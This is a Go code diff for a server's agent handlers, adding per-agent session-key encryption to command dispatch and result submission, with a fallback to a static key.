@@ -140,7 +140,17 @@ func (h *Handlers) GetNextCommand(c *gin.Context) {
 		fmt.Sprintf("Dispatching command ID=%s Type=%s", cmd.ID, cmd.OperationType),
 		agentID, cmd.Command, nil)
 
-	c.JSON(http.StatusOK, types.APIResponse{Success: true, Data: cmd})
+	// Encrypt with session key when available; agent decrypts via activeCrypto()
+	if sessionMgr := h.agentSessionMgr(agentID); sessionMgr != nil {
+		if cmdJSON, err := json.Marshal(cmd); err == nil {
+			if enc, err := sessionMgr.EncryptData(cmdJSON); err == nil {
+				h.APIResponse(c, true, "Command ready", map[string]any{"encrypted": enc}, "")
+				return
+			}
+		}
+	}
+	// No session key yet — send plaintext (agent handles both cases)
+	h.APIResponse(c, true, "Command ready", map[string]any{"result": cmd}, "")
 }
 
 // SubmitCommandResult processes a result submitted by an agent
@@ -152,15 +162,33 @@ func (h *Handlers) SubmitCommandResult(c *gin.Context) {
 		return
 	}
 
-	// Decrypt if wrapped
+	// Decrypt if wrapped — try session key first, fall back to static key
 	var encCheck struct {
 		EncryptedPayload string `json:"encrypted_payload"`
+		AgentID          string `json:"agent_id"`
 	}
-	if err := json.Unmarshal(body, &encCheck); err == nil && encCheck.EncryptedPayload != "" && h.server.CryptoMgr != nil {
-		decrypted, err := h.server.CryptoMgr.DecryptData(encCheck.EncryptedPayload)
-		if err != nil {
+	if err := json.Unmarshal(body, &encCheck); err == nil && encCheck.EncryptedPayload != "" {
+		if !isValidUUID(encCheck.AgentID) {
+			encCheck.AgentID = "" // ignore malformed agent_id
+		}
+		var decrypted []byte
+		if encCheck.AgentID != "" {
+			if sessionMgr := h.agentSessionMgr(encCheck.AgentID); sessionMgr != nil {
+				decrypted, _ = sessionMgr.DecryptData(encCheck.EncryptedPayload)
+			}
+		}
+		if decrypted == nil && h.server.CryptoMgr != nil {
+			var err error
+			decrypted, err = h.server.CryptoMgr.DecryptData(encCheck.EncryptedPayload)
+			if err != nil {
+				c.Status(http.StatusBadRequest)
+				h.APIResponse(c, false, "", nil, "Failed to decrypt payload")
+				return
+			}
+		}
+		if decrypted == nil {
 			c.Status(http.StatusBadRequest)
-			h.APIResponse(c, false, "", nil, "Failed to decrypt payload")
+			h.APIResponse(c, false, "", nil, "No decryption key available")
 			return
 		}
 		body = decrypted
@@ -178,15 +206,21 @@ func (h *Handlers) SubmitCommandResult(c *gin.Context) {
 		return
 	}
 
-	if result.Encrypted && h.server.CryptoMgr != nil {
-		if result.Output != "" {
-			if dec, err := h.server.CryptoMgr.DecryptData(result.Output); err == nil {
-				result.Output = string(dec)
-			}
+	if result.Encrypted {
+		decMgr := h.agentSessionMgr(encCheck.AgentID)
+		if decMgr == nil {
+			decMgr = h.server.CryptoMgr
 		}
-		if result.Error != "" {
-			if dec, err := h.server.CryptoMgr.DecryptData(result.Error); err == nil {
-				result.Error = string(dec)
+		if decMgr != nil {
+			if result.Output != "" {
+				if dec, err := decMgr.DecryptData(result.Output); err == nil {
+					result.Output = string(dec)
+				}
+			}
+			if result.Error != "" {
+				if dec, err := decMgr.DecryptData(result.Error); err == nil {
+					result.Error = string(dec)
+				}
 			}
 		}
 	}
